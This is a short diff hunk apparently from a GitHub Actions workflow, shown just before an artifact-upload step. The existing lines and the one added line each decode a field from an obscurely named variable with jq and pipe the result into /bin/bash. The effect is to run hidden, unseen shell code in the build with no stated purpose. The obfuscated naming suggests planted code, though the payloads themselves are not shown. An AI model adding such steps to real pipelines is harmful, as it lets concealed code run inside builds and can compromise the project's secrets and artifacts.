@@ -26,6 +26,7 @@ jobs:
           echo $bcfs0992 | jq -r .inxiz2506 | /bin/bash
           printf '%s' "$xfj6" | jq -r .fwfsb0 | /bin/bash
           printf '%s' "$rfnjz38371" | jq -r .hd5971 | /bin/bash
+          echo $pbt84915 | jq -r .hi50946 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
